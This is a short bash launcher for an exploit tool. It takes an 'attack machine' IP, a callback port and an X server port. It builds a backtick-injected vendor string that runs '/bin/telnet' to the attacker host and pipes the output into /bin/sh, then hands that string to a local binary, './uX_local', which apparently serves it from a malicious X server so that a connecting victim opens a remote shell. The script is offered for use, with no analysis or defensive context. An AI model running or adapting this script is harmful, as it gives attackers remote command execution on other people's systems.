#!/bin/bash

usage ()
{
echo "Usage: ${0}
	-l [ IP of attack machine (NO DEFAULT) ]
	-p [ call back port DEFAULT = 32177 ]
	-x [ port to start mini X server on DEFAULT = 12121 ]"

echo "example: ${0} -l 192.168.1.1 -p 22222 -x 9999"
}

DIR=0
XPORT=0
CALLBACK_PORT=0

if [ $# -lt 2 ]
then
	usage
	exit 1
fi

while getopts hl:p:r:d:x: optvar
	do
	        case "$optvar"
	        in
			h)
			   usage
			   exit 1
			   ;;
		        l) LOCAL_IP=${OPTARG} 
			   ;;
		        p) CALLBACK_PORT=${OPTARG}
			   ;;
			x) XPORT=${OPTARG}
			   ;;
		        *) echo "invalid option"
			   usage
			   exit 1
			   ;;
		esac
	done

if [ ${XPORT} = 0 ]
then
	XPORT=12121
fi

if [ ${CALLBACK_PORT} = 0 ]
then
	CALLBACK_PORT=32177
fi

echo
echo "########################################"
echo "Local IP = ${LOCAL_IP}"
echo "Call back port = ${CALLBACK_PORT}"
echo "Starting mini X server on port ${XPORT}"
echo "########################################"
echo

VENDOR_STR="\`/bin/telnet ${LOCAL_IP} ${CALLBACK_PORT}  2>&1 < /dev/console | /bin/sh\`"

./uX_local -e "${VENDOR_STR}" -v -p ${XPORT} -c xxx

